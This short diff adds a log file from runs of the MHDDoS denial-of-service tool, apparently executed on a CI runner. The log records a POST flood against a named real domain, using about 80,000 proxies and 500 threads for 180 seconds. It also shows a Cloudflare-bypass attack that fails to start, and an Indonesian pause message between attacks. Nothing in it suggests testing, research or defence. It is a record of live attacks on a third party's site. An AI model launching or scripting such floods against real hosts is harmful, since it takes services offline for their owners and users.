@@ -1,0 +1,14 @@
+POST PID: 72603
+=== ATTACK 2: POST Flood ===
+/tmp/MHDDoS/start.py:53: DeprecationWarning: ssl.OP_NO_SSL*/ssl.OP_NO_TLS* options are deprecated
+  ctx.options |= ssl.OP_NO_TLSv1
+/tmp/MHDDoS/start.py:55: DeprecationWarning: ssl.OP_NO_SSL*/ssl.OP_NO_TLS* options are deprecated
+  ctx.options |= ssl.OP_NO_TLSv1_1
+[08:15:06 - INFO] [93mProxy Count: [94m80,117[0m
+[08:15:07 - INFO] [93mAttack Started to[94m www.nadiavpn.web.id[93m with[94m POST[93m method for[94m 180[93m seconds, threads:[94m 500[93m![0m
+CFBUAM PID: 73106
+
+Menunggu 60 detik...
+
+=== ATTACK 3: CFBUAM ===
+python3: can't open file '/home/runner/start.py': [Errno 2] No such file or directory
